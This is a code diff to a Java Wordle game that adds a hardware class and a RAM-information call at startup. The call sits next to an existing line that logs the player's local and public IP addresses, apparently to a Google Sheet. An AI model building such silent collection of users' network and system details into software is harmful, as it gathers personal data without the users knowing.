@@ -25,6 +25,7 @@ public class Wordle
     private WordleGWindow wordleGame;
     String[] dictionaryArray = WordleDictionary.FIVE_LETTER_WORDS; //This String array contains all the words in the dictionary
     String[] guessList = new String[6];
+    HardwareStuff hardwareStuff = new HardwareStuff();
 
     // Current row and amount of guesses
     private int currentRow = 0;
@@ -308,6 +309,7 @@ public class Wordle
     {
         setCorrectWord(); // Runs the setCorrectWord method that you are making
         logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
+        hardwareStuff.getRamInfo();
 
         wordleGame = new WordleGWindow(); // Creates GUI
         wordleGame.addEnterListener(this::enterAction); // Arrow function, learn more about how it works in the documentation
